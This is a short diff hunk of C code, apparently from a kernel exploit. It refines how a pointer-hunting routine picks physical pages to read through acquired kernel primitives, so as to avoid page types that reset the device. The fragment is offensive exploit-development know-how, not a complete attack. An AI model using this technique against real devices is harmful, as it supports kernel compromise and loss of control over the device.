@@ -5424,7 +5424,7 @@ static BOOL kpHuntPtrOK(uint64_t v)
         int hits = 0;
         for (uint32_t i = 0; i < nall && hits < 16; i++) {
             uint8_t t = (uint8_t)(allPages[i] >> 32);
-            if (t == 0x13 || t == 0x14) continue;   // read-fault типы
+            if (t != 0x21 && t != 0x0b && t != 0x37) continue;   // только доказанно читаемые (v12: часть типов — EL2-ресет даже на чтении)
             uint64_t pa = pb + ((uint64_t)(uint32_t)allPages[i] << 14);
             uint64_t va = gPrimitives.phystokv(pa);
             uint8_t pgch[0x1000];
